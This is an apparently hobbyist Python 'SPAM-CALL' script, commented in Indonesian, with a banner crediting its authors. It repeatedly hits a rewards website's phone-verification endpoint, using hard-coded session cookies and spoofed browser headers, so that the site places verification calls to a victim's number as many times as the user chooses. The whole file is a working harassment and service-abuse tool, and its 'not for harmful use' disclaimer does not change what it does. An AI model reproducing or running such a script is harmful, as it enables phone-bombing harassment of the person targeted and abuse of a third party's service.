import os, sys, requests, termcolor
from termcolor import colored
import time
import subprocess

subprocess.call('clear',shell=True)

os.system('figlet "SPAM-CALL"')


banner = """
=========================================================================
Headers And Data   \033[1;91m:\033[1;96mKingTebe\033[1;97m
Github  \033[1;91m:\033[1;96mhttps://github.com/BlackHat-33\033[1;97m
Wasap   \033[1;91m:\033[1;92m+6282121902263\033[1;97m
Code  \033[1;91m:\033[1;96mABIN XD.5QX\033[1;97m
Github  \033[1;91m:\033[1;96mhttps://github.com/BenjaminCyber\033[1;97m
Instagram   \033[1;91m:\033[1;92m@abinayanafaiq_\033[1;97m
=========================================================================
[!]TIDAK DI GUNAKAN UNTUK HAL MERUGIKAN, AUTHOR TIDAK BERTANGGUNG JAWAB[!]
[!]DENGAN MENGGUNAKAN SCRIPT INI ANDA TELAH MENYETUJUI KAMI[!]

"""
print(banner)
def back():
	print(colored("SPAM LAGI ? Y/N",'red'))
	d = input(colored("ANSWER:",'green'))
	if d == "Y" or d == "y":
			hago()
	else:
			sys.exit(1)
class hago():
		url = "https://id.jagreward.com/member/verify-mobile/"

		head = {
		"X-Requested-With": "XMLHttpRequest",
		"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		"Content-Type": "application/json",
		"Origin": "https://id.jagreward.com",
		"Referer": "https://id.jagreward.com/member/register/",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
		"__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
		"_ga": "GA1.2.2037151396.1584709855",
		"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
		"DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
		}
		dat = {
		"method": "CALL",
		"countryCode": "id",
		}
		print(colored("CONTOH MASUKAN NOMOR TANPA +62/62/0  => 8566xxxxxxxx",'red'))
		nomor = input(colored("MASUKAN NOMOR YANG MAU DI SPAM:",'red'))
		jmlh = int(input(colored("MASUKAN JUMLAH SPAM:",'blue')))

		for x in range(jmlh):
			time.sleep(4)
			r = requests.get(url+nomor, data=dat, headers=head)
			if "Anda telah" in r.json()["message"]:
				print(colored("SPAM KE NOMOR " + nomor + " GAGAL KARENA TOKEN HABIS TUNGGU 30 MNT UNTUK MENGISI TOKEN , EH JANGAN NYEPAM TERUS KASIAN",'green'))
				sys.exit(1)
			elif "periksa" in  r.json()["message"]:
				print(colored("PERIKSA JARINGAN ANDA",'yellow'))
				time.sleep(4)
				hago()
			else:
				print(colored("SPAM KE NOMOR " + nomor + " SUKSES",'red'))
hago()
back()
